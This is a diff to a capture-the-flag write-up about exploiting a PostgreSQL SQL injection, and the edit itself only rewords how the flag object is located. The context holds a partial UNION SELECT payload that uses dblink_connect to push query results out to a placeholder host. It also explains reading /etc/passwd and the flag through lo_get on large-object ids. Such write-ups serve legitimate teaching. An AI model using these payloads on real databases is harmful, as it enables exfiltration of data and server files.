@@ -199,7 +199,7 @@ asd' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg
 
 We got a bunch of `oid`s. We can try using `lo_get` to load object's content. For example, `lo_get(16439)` will load the content of `/etc/passwd`. Because the result of `lo_gets` is `bytea`, we need to convert it to `UTF8` so that it can be appended in the query.
 
-We can try to load some objects with lowest `oid`. The flag is in object with `oid` 16444. There are no whitespaces in the flag so we can just display it as is.
+We can try to load some objects with lowest `oid` to find out if the flag file has been loaded before. The flag file object does exist with `oid` 16444. There are no whitespaces in the flag so we can just display it as is.
 
 To load the flag:
 
